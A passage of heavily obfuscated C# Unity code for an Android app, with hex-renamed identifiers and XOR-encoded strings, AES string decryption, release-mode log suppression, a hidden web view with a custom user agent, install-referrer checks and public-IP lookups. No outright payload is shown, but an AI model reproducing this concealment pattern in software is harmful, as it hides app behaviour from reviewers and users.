using AndroidInstallReferrer;
using DG.Tweening;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Unity.Notifications.Android;
using Unity.Services.Authentication;
using Unity.Services.CloudSave;
using Unity.Services.CloudSave.Models;
using Unity.Services.CloudSave.Models.Data.Player;
using Unity.Services.Core;
using Unity.Services.PushNotifications;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.InputSystem;
using UnityEngine.InputSystem.EnhancedTouch;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Application = UnityEngine.Application;

public class _0xdf35893b : MonoBehaviour
{
    private string _0xfcd36ac6 = "";
    internal bool isApplicationFocus = false;
    private string _0xe3ef5c36 { get; set; }

    private string _0xe8ae105c()
    {
        float _0x8d52ca16 = Time.realtimeSinceStartup;
        if (_0x8d52ca16 < 0f)
            _0x8d52ca16 = 0f;
        int _0x252b2918 = (int)(_0x8d52ca16 * 1000f);
        int _0x2ef110ea = _0x252b2918 / 60000;
        int _0x04283431 = (_0x252b2918 / 1000) % 60;
        int _0x987ca226 = _0x252b2918 % 1000;
        return string.Format(_0x85e40e1c._0x8a9d8fd6(new byte[21] { 57, 114, 120, 114, 114, 63, 120, 57, 115, 120, 114, 114, 63, 120, 57, 112, 120, 114, 114, 114, 63 }, 66), _0x2ef110ea, _0x04283431, _0x987ca226);
    }

    private ApplicationInstallMode _0xfe372202 = ApplicationInstallMode.Unknown;
    private float _0x4fff9674 = 0f;
    private string _0x7cc68d45 = "";
    private async Task<bool> _0x45bbc1cc(int _0xb72d1d7f = 5, int _0xd3defaa1 = 500)
    {
        List<EntityData> _0x5fccf1e7 = new List<EntityData>();
        int _0x94e1e629 = 0;
        do
        {
            try
            {
                _0x5fccf1e7 = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x85e40e1c._0x8a9d8fd6(new byte[8] { 63, 35, 46, 54, 42, 61, 6, 43 }, 79), _0x8a05b7f7, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x85e40e1c._0x8a9d8fd6(new byte[9] { 252, 230, 197, 231, 252, 227, 244, 246, 236 }, 149) }), new QueryOptions())).ToList();
            }
            catch (Exception e)
            {
                {
#if B_LOGS
                    {
                        Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[32] { 206, 193, 240, 230, 225, 200, 181, 228, 224, 240, 231, 236, 212, 230, 236, 251, 246, 199, 240, 230, 224, 249, 225, 230, 181, 240, 231, 231, 250, 231, 175, 181 }, 149) + e.Message);
                    }
#endif
                }
            }

            await Task.Delay(_0xd3defaa1);
        }
        while (_0x5fccf1e7.Count == 0 && _0x94e1e629++ < _0xb72d1d7f);
        {
#if B_LOGS
            {
                Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[32] { 80, 95, 110, 120, 127, 86, 43, 66, 120, 91, 121, 98, 125, 106, 104, 114, 43, 90, 126, 110, 121, 114, 43, 121, 110, 120, 126, 103, 127, 120, 49, 43 }, 11) + JsonConvert.SerializeObject(_0x5fccf1e7, Formatting.Indented));
            }
#endif
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[38] { 231, 232, 217, 207, 200, 225, 156, 245, 207, 236, 206, 213, 202, 221, 223, 197, 156, 237, 201, 217, 206, 197, 156, 206, 217, 207, 201, 208, 200, 207, 156, 223, 211, 201, 210, 200, 134, 156 }, 188) + _0x5fccf1e7.Count);
            }
#endif
        }

        bool _0x0d788d35 = true;
        if (_0x5fccf1e7.Count == 0)
        {
            _0x0d788d35 = false;
        }
        else
        {
            _0x0d788d35 = _0x5fccf1e7.Any(_0x00afede5 => _0x00afede5.Data.Any(IsPrivacyItemTrue));
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[25] { 13, 2, 51, 37, 34, 11, 118, 31, 37, 6, 36, 63, 32, 55, 53, 47, 118, 36, 51, 37, 35, 58, 34, 108, 118 }, 86) + _0x0d788d35);
            }
#endif
        }

        return _0x0d788d35;
    }

    private Text _0x8aa470f9;
    private string _0x137134ef()
    {
        string _0x6e3a98c9 = _0xba975fa4();
        if (string.IsNullOrEmpty(_0x6e3a98c9))
            return _0x85e40e1c._0x8a9d8fd6(new byte[7] { 94, 71, 65, 76, 8, 24, 19 }, 40);
        string _0x829d5397 = _0x6e3a98c9.Replace(_0x85e40e1c._0x8a9d8fd6(new byte[1] { 172 }, 240), _0x85e40e1c._0x8a9d8fd6(new byte[2] { 143, 143 }, 211)).Replace(_0x85e40e1c._0x8a9d8fd6(new byte[1] { 159 }, 184), _0x85e40e1c._0x8a9d8fd6(new byte[2] { 120, 3 }, 36));
        var _0xb22237d0 = Regex.Match(_0x6e3a98c9, _0x85e40e1c._0x8a9d8fd6(new byte[12] { 165, 142, 148, 137, 139, 131, 201, 206, 186, 130, 205, 207 }, 230));
        string _0xf43bf533 = _0xb22237d0.Success ? _0xb22237d0.Groups[1].Value : _0x85e40e1c._0x8a9d8fd6(new byte[3] { 238, 237, 239 }, 223);
        return _0x85e40e1c._0x8a9d8fd6(new byte[12] { 143, 193, 210, 201, 196, 211, 206, 200, 201, 143, 142, 220 }, 167) + _0x85e40e1c._0x8a9d8fd6(new byte[8] { 112, 103, 116, 38, 115, 103, 59, 33 }, 6) + _0x829d5397 + _0x85e40e1c._0x8a9d8fd6(new byte[2] { 138, 150 }, 173) + _0x85e40e1c._0x8a9d8fd6(new byte[30] { 113, 102, 117, 39, 119, 117, 104, 115, 104, 58, 73, 102, 113, 110, 96, 102, 115, 104, 117, 41, 119, 117, 104, 115, 104, 115, 126, 119, 98, 60 }, 7) + _0x85e40e1c._0x8a9d8fd6(new byte[121] { 46, 61, 38, 43, 60, 33, 39, 38, 104, 44, 45, 46, 96, 39, 42, 34, 100, 35, 45, 49, 100, 62, 41, 36, 97, 51, 60, 58, 49, 51, 7, 42, 34, 45, 43, 60, 102, 44, 45, 46, 33, 38, 45, 24, 58, 39, 56, 45, 58, 60, 49, 96, 39, 42, 34, 100, 35, 45, 49, 100, 51, 47, 45, 60, 114, 46, 61, 38, 43, 60, 33, 39, 38, 96, 97, 51, 58, 45, 60, 61, 58, 38, 104, 62, 41, 36, 115, 53, 100, 43, 39, 38, 46, 33, 47, 61, 58, 41, 42, 36, 45, 114, 60, 58, 61, 45, 53, 97, 115, 53, 43, 41, 60, 43, 32, 96, 45, 97, 51, 53, 53 }, 72) + _0x85e40e1c._0x8a9d8fd6(new byte[26] { 204, 205, 206, 128, 216, 218, 199, 220, 199, 132, 143, 221, 219, 205, 218, 233, 207, 205, 198, 220, 143, 132, 221, 201, 129, 147 }, 168) + _0x85e40e1c._0x8a9d8fd6(new byte[52] { 134, 135, 132, 202, 146, 144, 141, 150, 141, 206, 197, 131, 146, 146, 180, 135, 144, 145, 139, 141, 140, 197, 206, 151, 131, 204, 144, 135, 146, 142, 131, 129, 135, 202, 205, 188, 175, 141, 152, 139, 142, 142, 131, 190, 205, 205, 206, 197, 197, 203, 203, 217 }, 226) + _0x85e40e1c._0x8a9d8fd6(new byte[37] { 227, 226, 225, 175, 247, 245, 232, 243, 232, 171, 160, 247, 235, 230, 243, 225, 232, 245, 234, 160, 171, 160, 203, 238, 233, 242, 255, 167, 230, 245, 234, 241, 191, 235, 160, 174, 188 }, 135) + _0x85e40e1c._0x8a9d8fd6(new byte[34] { 206, 207, 204, 130, 218, 216, 197, 222, 197, 134, 141, 220, 207, 196, 206, 197, 216, 141, 134, 141, 237, 197, 197, 205, 198, 207, 138, 227, 196, 201, 132, 141, 131, 145 }, 170) + _0x85e40e1c._0x8a9d8fd6(new byte[30] { 172, 173, 174, 224, 184, 186, 167, 188, 167, 228, 239, 165, 169, 176, 156, 167, 189, 171, 160, 152, 167, 161, 166, 188, 187, 239, 228, 253, 225, 243 }, 200) + _0x85e40e1c._0x8a9d8fd6(new byte[48] { 180, 178, 185, 187, 182, 161, 178, 224, 181, 161, 164, 253, 187, 162, 178, 161, 174, 164, 179, 250, 155, 187, 162, 178, 161, 174, 164, 250, 231, 131, 168, 178, 175, 173, 169, 181, 173, 231, 236, 182, 165, 178, 179, 169, 175, 174, 250, 231 }, 192) + _0xf43bf533 + _0x85e40e1c._0x8a9d8fd6(new byte[35] { 181, 239, 190, 233, 240, 224, 243, 252, 246, 168, 181, 213, 253, 253, 245, 254, 247, 178, 209, 250, 224, 253, 255, 247, 181, 190, 228, 247, 224, 225, 251, 253, 252, 168, 181 }, 146) + _0xf43bf533 + _0x85e40e1c._0x8a9d8fd6(new byte[238] { 79, 21, 68, 19, 10, 26, 9, 6, 12, 82, 79, 38, 7, 28, 85, 41, 87, 42, 26, 9, 6, 12, 79, 68, 30, 13, 26, 27, 1, 7, 6, 82, 79, 90, 92, 79, 21, 53, 68, 5, 7, 10, 1, 4, 13, 82, 28, 26, 29, 13, 68, 24, 4, 9, 28, 14, 7, 26, 5, 82, 79, 41, 6, 12, 26, 7, 1, 12, 79, 68, 15, 13, 28, 32, 1, 15, 0, 45, 6, 28, 26, 7, 24, 17, 62, 9, 4, 29, 13, 27, 82, 14, 29, 6, 11, 28, 1, 7, 6, 64, 65, 19, 26, 13, 28, 29, 26, 6, 72, 56, 26, 7, 5, 1, 27, 13, 70, 26, 13, 27, 7, 4, 30, 13, 64, 19, 9, 26, 11, 0, 1, 28, 13, 11, 28, 29, 26, 13, 82, 79, 9, 26, 5, 79, 68, 10, 1, 28, 6, 13, 27, 27, 82, 79, 94, 92, 79, 68, 5, 7, 10, 1, 4, 13, 82, 28, 26, 29, 13, 68, 5, 7, 12, 13, 4, 82, 79, 79, 68, 24, 4, 9, 28, 14, 7, 26, 5, 82, 79, 41, 6, 12, 26, 7, 1, 12, 79, 68, 24, 4, 9, 28, 14, 7, 26, 5, 62, 13, 26, 27, 1, 7, 6, 82, 79, 89, 92, 70, 88, 70, 88, 79, 68, 29, 9, 46, 29, 4, 4, 62, 13, 26, 27, 1, 7, 6, 82, 79 }, 104) + _0xf43bf533 + _0x85e40e1c._0x8a9d8fd6(new byte[117] { 31, 1, 31, 1, 31, 1, 22, 76, 24, 10, 76, 76, 10, 126, 83, 91, 84, 82, 69, 31, 85, 84, 87, 88, 95, 84, 97, 67, 94, 65, 84, 67, 69, 72, 25, 65, 67, 94, 69, 94, 29, 22, 68, 66, 84, 67, 112, 86, 84, 95, 69, 117, 80, 69, 80, 22, 29, 74, 86, 84, 69, 11, 87, 68, 95, 82, 69, 88, 94, 95, 25, 24, 74, 67, 84, 69, 68, 67, 95, 17, 68, 80, 85, 10, 76, 29, 82, 94, 95, 87, 88, 86, 68, 67, 80, 83, 93, 84, 11, 69, 67, 68, 84, 76, 24, 10, 76, 82, 80, 69, 82, 89, 25, 84, 24, 74, 76 }, 49) + _0x85e40e1c._0x8a9d8fd6(new byte[5] { 250, 174, 175, 174, 188 }, 135);
    }

    private void OnApplicationPause(bool _0x6851c577)
    {
        isApplicationPause = _0x6851c577;
    }

    private string _0x47fd9f3e = "";
    private bool _0x11580a39 = false;
    private int _0x7d2322a1 = 0;
    private Canvas _0xc58220d9;
    private bool _0x5a1ea031 = false;
    internal void Update()
    {
        if (_0x3053905e == null)
            return;
        if (_0x86b94f6b())
            _0x8631a3c2();
        if (!isApplicationFocus || isApplicationPause)
            return;
        _0xce3db8b5();
        if (_0x5a1ea031 && _0xc42e8284 != null)
            _0xc42e8284.Rotate(0f, 0f, -360f * Time.deltaTime);
    }

    private bool _0x16b62f65 = false;
    private void Awake()
    {
        if (_0x20d63bf4 != null)
        {
            Destroy(this.gameObject);
            return;
        }

        EnhancedTouchSupport.Enable();
        Input.backButtonLeavesApp = false;
        {
#if !B_LOGS
            Debug.unityLogger.logEnabled = false;
            Application.SetStackTraceLogType(LogType.Assert, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Exception, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Warning, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Error, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Log, StackTraceLogType.None);
#endif
        }

        _0x20d63bf4 = gameObject.GetComponent<_0xdf35893b>();
        DontDestroyOnLoad(gameObject);
        _0x12a53b5d = _0x3bc5583a = _0xe3ef5c36 = "";
        _0x7d385db6 = "";
        _0xacdd5220 = false;
    }

    private RectTransform _0xc42e8284;
    private Action _0x0ea19295;
    // NATIVE WEB VIEW METHODS
    private UniWebView _0x3053905e = null;
    private string _0x12e1abed;
    internal Button _0x71045bee(string _0x77f75986, Transform _0x29f32c0a)
    {
        var _0x3e45c4ab = new GameObject(_0x77f75986 + _0x85e40e1c._0x8a9d8fd6(new byte[3] { 146, 164, 190 }, 208), typeof(RectTransform), typeof(Image), typeof(Button));
        var _0xf5fc36ba = _0x3e45c4ab.GetComponent<RectTransform>();
        _0xf5fc36ba.SetParent(_0x29f32c0a, false);
        var _0xd9731b0c = _0x3e45c4ab.GetComponent<Image>();
        _0xd9731b0c.color = new Color(0.92f, 0.92f, 0.95f, 1f);
        var _0xed0572a4 = _0x3e45c4ab.GetComponent<Button>();
        var _0xa0a202be = _0xed0572a4.colors;
        _0xa0a202be.highlightedColor = new Color(0.85f, 0.85f, 0.9f);
        _0xa0a202be.pressedColor = new Color(0.8f, 0.8f, 0.88f);
        _0xed0572a4.colors = _0xa0a202be;
        var _0x7d2a35c5 = new GameObject(_0x85e40e1c._0x8a9d8fd6(new byte[4] { 232, 217, 196, 200 }, 188), typeof(RectTransform), typeof(Text));
        var _0x7dd2d731 = _0x7d2a35c5.GetComponent<RectTransform>();
        _0x7dd2d731.SetParent(_0x3e45c4ab.transform, false);
        _0x7dd2d731.anchorMin = Vector2.zero;
        _0x7dd2d731.anchorMax = Vector2.one;
        _0x7dd2d731.offsetMin = _0x7dd2d731.offsetMax = Vector2.zero;
        var _0x6218ede6 = _0x7d2a35c5.GetComponent<Text>();
        _0x6218ede6.text = _0x77f75986;
        _0x6218ede6.alignment = TextAnchor.MiddleCenter;
        _0x6218ede6.color = Color.black;
        _0x6218ede6.font = Resources.GetBuiltinResource<Font>(_0x85e40e1c._0x8a9d8fd6(new byte[9] { 175, 156, 135, 143, 130, 192, 154, 154, 136 }, 238));
        _0x6218ede6.fontSize = 28;
        WLog(_0x85e40e1c._0x8a9d8fd6(new byte[14] { 111, 94, 73, 77, 88, 73, 110, 89, 88, 88, 67, 66, 12, 11 }, 44) + _0x77f75986 + _0x85e40e1c._0x8a9d8fd6(new byte[1] { 116 }, 83));
        return _0xed0572a4;
    }

    private bool _0xffed205c(string _0x86c44a0f, string _0xe658e9f9)
    {
        string _0xc0942549 = _0xd8fc6655(_0x86c44a0f);
        if (string.IsNullOrEmpty(_0xc0942549))
            _0xc0942549 = _0xe658e9f9;
        if (_0xe33ac0e7(_0xc0942549))
            return true;
        string _0x0655be02 = string.IsNullOrEmpty(_0xc0942549) ? _0x85e40e1c._0x8a9d8fd6(new byte[29] { 131, 159, 159, 155, 152, 209, 196, 196, 155, 135, 138, 146, 197, 140, 132, 132, 140, 135, 142, 197, 136, 132, 134, 196, 152, 159, 132, 153, 142 }, 235) : _0x85e40e1c._0x8a9d8fd6(new byte[46] { 18, 14, 14, 10, 9, 64, 85, 85, 10, 22, 27, 3, 84, 29, 21, 21, 29, 22, 31, 84, 25, 21, 23, 85, 9, 14, 21, 8, 31, 85, 27, 10, 10, 9, 85, 30, 31, 14, 27, 19, 22, 9, 69, 19, 30, 71 }, 122) + _0xc0942549;
        WLog(_0x85e40e1c._0x8a9d8fd6(new byte[35] { 50, 25, 3, 30, 28, 20, 61, 24, 26, 20, 81, 28, 16, 3, 26, 20, 5, 81, 23, 16, 29, 29, 19, 16, 18, 26, 81, 16, 2, 81, 6, 20, 19, 75, 81 }, 113) + _0x0655be02);
        return _0x3f68adbc(_0x0655be02);
    }

    private async Task<bool> _0x5dd95860()
    {
        _0xe7cafbca.Instance.AnimSliderSequence.Pause();
        PushNotificationsService.Instance.OnRemoteNotificationReceived += (_0x1eb0e805) =>
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[32] { 45, 34, 19, 5, 2, 43, 86, 35, 24, 31, 2, 15, 86, 38, 3, 5, 30, 86, 56, 25, 2, 31, 16, 31, 21, 23, 2, 31, 25, 24, 76, 86 }, 118) + string.Join(_0x85e40e1c._0x8a9d8fd6(new byte[1] { 109 }, 100), _0x1eb0e805));
                }
#endif
            }
        };
        try
        {
            _0x12a53b5d = await PushNotificationsService.Instance.RegisterForPushNotificationsAsync();
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[31] { 105, 102, 87, 65, 70, 111, 18, 116, 83, 91, 94, 87, 86, 18, 70, 93, 18, 85, 87, 70, 18, 66, 71, 65, 90, 18, 70, 93, 89, 87, 92 }, 50));
                }
#endif
            }

            _0x12a53b5d = "";
        }

        _0xf9fb5bb1 = !string.IsNullOrEmpty(_0x12a53b5d);
        _0xb7489e69 = _0xe8ae105c();
        {
#if B_LOGS
            Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[25] { 51, 60, 13, 27, 28, 53, 72, 61, 6, 1, 28, 17, 72, 56, 29, 27, 0, 72, 60, 7, 3, 13, 6, 82, 72 }, 104) + _0x12a53b5d);
#endif
        }

        _0xe7cafbca.Instance.AnimSliderSequence.Play();
        return false;
    }

    private string _0x10605258()
    {
        string _0x438b459a = _0x85e40e1c._0x8a9d8fd6(new byte[62] { 111, 108, 109, 106, 107, 104, 105, 102, 103, 100, 101, 98, 99, 96, 97, 126, 127, 124, 125, 122, 123, 120, 121, 118, 119, 116, 79, 76, 77, 74, 75, 72, 73, 70, 71, 68, 69, 66, 67, 64, 65, 94, 95, 92, 93, 90, 91, 88, 89, 86, 87, 84, 62, 63, 60, 61, 58, 59, 56, 57, 54, 55 }, 14);
        System.Random _0xd6a5747a = new System.Random();
        int _0x74a605a4 = _0xd6a5747a.Next(8, 16);
        return new string (Enumerable.Repeat(_0x438b459a, _0x74a605a4).Select(_0x6ed36df0 => _0x6ed36df0[_0xd6a5747a.Next(_0x6ed36df0.Length)]).ToArray());
    }

    private void _0x3702ba62()
    {
        _0x8b31787f = true;
        if (_0x3053905e != null)
            _0x3053905e.SetUserAgent(_0xba975fa4());
    }

    private string Decrypt(string _0x2f88abe0, string _0x96ac5501)
    {
        try
        {
            var _0x40864e19 = Convert.FromBase64String(_0x2f88abe0);
            using var _0x397944f4 = Aes.Create();
            _0x397944f4.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0x96ac5501));
            var _0x0fa8556f = new byte[16];
            Buffer.BlockCopy(_0x40864e19, 0, _0x0fa8556f, 0, 16);
            _0x397944f4.IV = _0x0fa8556f;
            using var _0x7225934b = new MemoryStream(_0x40864e19, 16, _0x40864e19.Length - 16);
            using var _0x99746f1f = new CryptoStream(_0x7225934b, _0x397944f4.CreateDecryptor(), CryptoStreamMode.Read);
            using var _0x78dade5f = new StreamReader(_0x99746f1f, Encoding.UTF8);
            return _0x78dade5f.ReadToEnd();
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private bool _0xf9fb5bb1 = false;
    private readonly string[] _0x03863b7b = new string[]
    {
        _0x85e40e1c._0x8a9d8fd6(new byte[60] { 72, 39, 54, 8, 152, 236, 208, 221, 152, 202, 221, 221, 212, 203, 152, 217, 202, 221, 152, 208, 215, 204, 152, 202, 209, 223, 208, 204, 152, 214, 215, 207, 152, 90, 56, 43, 152, 220, 215, 214, 90, 56, 33, 204, 152, 213, 209, 203, 203, 152, 193, 215, 205, 202, 152, 203, 200, 209, 214, 153 }, 184),
        _0x85e40e1c._0x8a9d8fd6(new byte[52] { 100, 11, 25, 20, 180, 221, 224, 180, 247, 251, 225, 248, 240, 180, 246, 241, 180, 237, 251, 225, 230, 180, 248, 225, 247, 255, 237, 180, 249, 251, 249, 241, 250, 224, 180, 118, 20, 7, 180, 227, 252, 237, 180, 231, 224, 251, 228, 180, 250, 251, 227, 171 }, 148),
        _0x85e40e1c._0x8a9d8fd6(new byte[66] { 149, 237, 214, 152, 207, 248, 87, 53, 30, 16, 87, 0, 30, 25, 4, 87, 22, 5, 18, 87, 31, 30, 3, 3, 30, 25, 16, 87, 26, 24, 5, 18, 87, 24, 17, 3, 18, 25, 87, 3, 24, 19, 22, 14, 87, 149, 247, 228, 87, 4, 3, 22, 14, 87, 30, 25, 87, 3, 31, 18, 87, 16, 22, 26, 18, 89 }, 119),
        _0x85e40e1c._0x8a9d8fd6(new byte[54] { 168, 199, 205, 202, 120, 12, 48, 49, 43, 120, 49, 43, 120, 40, 42, 49, 53, 61, 120, 44, 49, 53, 61, 120, 186, 216, 203, 120, 44, 48, 61, 120, 58, 61, 43, 44, 120, 40, 52, 57, 33, 61, 42, 43, 120, 40, 52, 57, 33, 120, 54, 55, 47, 118 }, 88),
        _0x85e40e1c._0x8a9d8fd6(new byte[48] { 182, 217, 210, 227, 102, 31, 41, 51, 52, 102, 49, 47, 40, 40, 47, 40, 33, 102, 53, 50, 52, 35, 39, 45, 102, 37, 41, 51, 42, 34, 102, 36, 35, 102, 41, 40, 35, 102, 53, 54, 47, 40, 102, 39, 49, 39, 63, 104 }, 70),
        _0x85e40e1c._0x8a9d8fd6(new byte[65] { 246, 153, 156, 134, 38, 76, 103, 101, 109, 118, 105, 114, 117, 38, 103, 116, 99, 38, 107, 105, 116, 99, 38, 103, 101, 114, 111, 112, 99, 38, 114, 105, 104, 111, 97, 110, 114, 38, 228, 134, 149, 38, 117, 114, 103, 127, 38, 103, 104, 98, 38, 114, 116, 127, 38, 127, 105, 115, 116, 38, 106, 115, 101, 109, 40 }, 6),
        _0x85e40e1c._0x8a9d8fd6(new byte[55] { 174, 193, 208, 236, 126, 27, 40, 59, 44, 39, 126, 45, 46, 55, 48, 126, 61, 49, 43, 48, 42, 45, 126, 188, 222, 205, 126, 42, 54, 59, 126, 48, 59, 38, 42, 126, 49, 48, 59, 126, 61, 49, 43, 50, 58, 126, 60, 59, 126, 39, 49, 43, 44, 45, 112 }, 94),
        _0x85e40e1c._0x8a9d8fd6(new byte[63] { 22, 89, 100, 27, 76, 123, 212, 164, 152, 149, 141, 145, 134, 135, 212, 134, 157, 147, 156, 128, 212, 154, 155, 131, 212, 149, 134, 145, 212, 131, 157, 154, 154, 157, 154, 147, 212, 22, 116, 103, 212, 144, 155, 154, 22, 116, 109, 128, 212, 131, 149, 152, 159, 212, 149, 131, 149, 141, 212, 141, 145, 128, 218 }, 244),
        _0x85e40e1c._0x8a9d8fd6(new byte[51] { 111, 0, 16, 25, 191, 208, 241, 243, 230, 191, 235, 247, 240, 236, 250, 191, 232, 247, 240, 191, 236, 235, 254, 230, 191, 246, 241, 191, 235, 247, 250, 191, 248, 254, 242, 250, 191, 232, 246, 241, 191, 235, 247, 250, 191, 239, 237, 246, 229, 250, 177 }, 159),
        _0x85e40e1c._0x8a9d8fd6(new byte[64] { 0, 120, 67, 13, 90, 109, 194, 175, 141, 143, 135, 140, 150, 151, 143, 194, 139, 145, 194, 135, 148, 135, 144, 155, 150, 138, 139, 140, 133, 194, 0, 98, 113, 194, 137, 135, 135, 146, 194, 145, 146, 139, 140, 140, 139, 140, 133, 194, 132, 141, 144, 194, 155, 141, 151, 144, 194, 129, 138, 131, 140, 129, 135, 204 }, 226)
    };
    //    private async Task<string> GetMyip()
    //    {
    //        string result = "";
    //        var processorType = SystemInfo.processorType;
    //        //        {
    //        //#if NOT_B_STARTED
    //        //#endif
    //        if (!processorType.Contains("armv7", StringComparison.OrdinalIgnoreCase) && !processorType.Contains("x86-64", StringComparison.OrdinalIgnoreCase))
    //        {
    //            var tcs = new TaskCompletionSource<string>();
    //            // Primary and fallback STUN servers (Google STUN 1-6)
    //            var stunServers = new[]
    //            {
    //                new[] { "stun:stun.l.google.com:19302" },      // Primary
    //                //new[] { "stun:stun1.l.google.com:19302" },     // Fallback 1
    //                //new[] { "stun:stun2.l.google.com:19302" },     // Fallback 2
    //                //new[] { "stun:stun3.l.google.com:19302" },     // Fallback 3
    //                //new[] { "stun:stun4.l.google.com:19302" },     // Fallback 4
    //                //new[] { "stun:stun5.l.google.com:19302" },     // Fallback 5
    //                //new[] { "stun:stun6.l.google.com:19302" }      // Fallback 6
    //            };
    //            RTCPeerConnection pc = null;
    //            foreach (var serverUrls in stunServers)
    //            {
    //                if (tcs.Task.IsCompleted)
    //                    break;
    //                try
    //                {
    //                    var config = new RTCConfiguration
    //                    {
    //                        iceServers = new RTCIceServer[]
    //                        {
    //                    new RTCIceServer { urls = serverUrls }
    //                        },
    //                        iceTransportPolicy = RTCIceTransportPolicy.All
    //                    };
    //                    pc = new RTCPeerConnection(ref config);
    //                    pc.OnIceCandidate = candidate =>
    //                    {
    //                        if (candidate == null || tcs.Task.IsCompleted)
    //                            return;
    //                        if (candidate.Type == RTCIceCandidateType.Srflx || candidate.Type == RTCIceCandidateType.Prflx)
    //                        {
    //                            string address = candidate.Address;
    //                            string ip = "";
    //                            // Parse IP from address (which may be IPv4 "ip:port" or IPv6 "[ip]:port")
    //                            if (address.StartsWith("[") && address.Contains("]:"))
    //                            {
    //                                // IPv6 format: [2001:db8::1]:12345
    //                                int endBracket = address.IndexOf(']');
    //                                ip = address.Substring(1, endBracket - 1);
    //                            }
    //                            else if (address.Contains(':'))
    //                            {
    //                                // IPv4 format: 192.168.1.1:12345
    //                                int lastColon = address.LastIndexOf(':');
    //                                ip = address.Substring(0, lastColon);
    //                            }
    //                            else
    //                            {
    //                                // No port, just IP
    //                                ip = address;
    //                            }
    //                            {
    //#if B_LOGS
    //                                {
    //                                    Debug.Log($"[test STUN] Public IP: {ip} from {serverUrls[0]}");
    //                                }
    //#endif
    //                            }
    //                            tcs.TrySetResult(ip);
    //                        }
    //                    };
    //                    pc.CreateDataChannel("init");
    //                    var offerOp = pc.CreateOffer();
    //                    while (!offerOp.IsDone)
    //                        await Task.Yield();
    //                    var desc = offerOp.Desc;
    //                    pc.SetLocalDescription(ref desc);
    //                    float timeout = 10f;
    //                    float t = 0f;
    //                    while (!tcs.Task.IsCompleted && t < timeout)
    //                    {
    //                        await Task.Delay(100);
    //                        t += 0.1f;
    //                    }
    //                    if (tcs.Task.IsCompleted)
    //                    {
    //                        result = tcs.Task.Result;
    //                        break;
    //                    }
    //                    {
    //#if B_LOGS
    //                        {
    //                            Debug.Log($"[test STUN] Failed with {serverUrls[0]}, trying next...");
    //                        }
    //#endif
    //                    }
    //                }
    //                catch (Exception ex)
    //                {
    //#if B_LOGS
    //                    {
    //                        Debug.Log($"[test STUN] Error with {serverUrls[0]}: {ex.Message}");
    //                    }
    //#endif
    //                    if (pc != null)
    //                    {
    //                        pc.Close();
    //                        pc.Dispose();
    //                    }
    //                }
    //            }
    //            if (!tcs.Task.IsCompleted)
    //                result = "";
    //        }
    //        //#if NOT_B_STARTED
    //        //            else
    //        //        if(result == "")
    //        //        {
    //        //            {
    //        //#if B_LOGS
    //        //                {
    //        //                    Debug.LogError($"[TEST] WebRTC DLL missing or ARMv7 architecture");
    //        //                }
    //        //#endif
    //        //            }
    //        //            result = await GetMyipFallback("0fce0027001c001700140011000b000a0008001f00180022001b00010024001e0025002300260002000400050006000300070000000c001d0015000d000f0021000900100019001a0013000e00120020001647175e80370ec5a1a5d9b1b039a49e64977f39d478adcf763f556d428a45d94f056b1d88f6b76874");
    //        //        }
    //        //#endif
    //        //        }
    //        {
    //#if B_LOGS
    //            {
    //                Debug.Log($"[Test] Get my ip: {result}");
    //            }
    //#endif
    //        }
    //        return result;
    //    }
    private async Task<string> _0xc554ac28()
    {
        var _0x9b9b7ee3 = _0x85e40e1c._0x8a9d8fd6(new byte[40] { 99, 127, 127, 123, 120, 49, 36, 36, 124, 124, 124, 37, 104, 103, 100, 126, 111, 109, 103, 106, 121, 110, 37, 104, 100, 102, 36, 104, 111, 101, 38, 104, 108, 98, 36, 127, 121, 106, 104, 110 }, 11);
        using (UnityWebRequest _0x92964b5f = UnityWebRequest.Get(_0x9b9b7ee3))
        {
            await _0x92964b5f.SendWebRequest();
            string[] _0xec74fc9b = _0x92964b5f.downloadHandler.text.Split('\n');
            foreach (string _0x3552f6f8 in _0xec74fc9b)
            {
                if (_0x3552f6f8.StartsWith(_0x85e40e1c._0x8a9d8fd6(new byte[3] { 246, 239, 162 }, 159)))
                {
                    string _0xb8928a44 = _0x3552f6f8.Substring(3);
                    {
#if B_LOGS
                        {
                            Debug.Log($"[Test] User ip (FALLBACK MODE): {_0xb8928a44} from {_0x9b9b7ee3}");
                        }
#endif
                    }

                    return _0xb8928a44;
                }
            }
        }

        return "";
    }

    private void OnDestroy()
    {
        StopAllCoroutines();
        _0x70f889de();
    }

    // WEB VIEW LOGIC END
    internal void _0x6888ea0f()
    {
        // Ensure channel exists (safe to call multiple times)
        var _0xb46947b1 = new AndroidNotificationChannel
        {
            Id = _0x85e40e1c._0x8a9d8fd6(new byte[15] { 135, 134, 133, 130, 150, 143, 151, 188, 128, 139, 130, 141, 141, 134, 143 }, 227),
            Name = _0x85e40e1c._0x8a9d8fd6(new byte[15] { 254, 223, 220, 219, 207, 214, 206, 154, 249, 210, 219, 212, 212, 223, 214 }, 186),
            Importance = Importance.High,
            Description = _0x85e40e1c._0x8a9d8fd6(new byte[21] { 227, 193, 202, 193, 214, 197, 200, 132, 202, 203, 208, 205, 194, 205, 199, 197, 208, 205, 203, 202, 215 }, 164)
        };
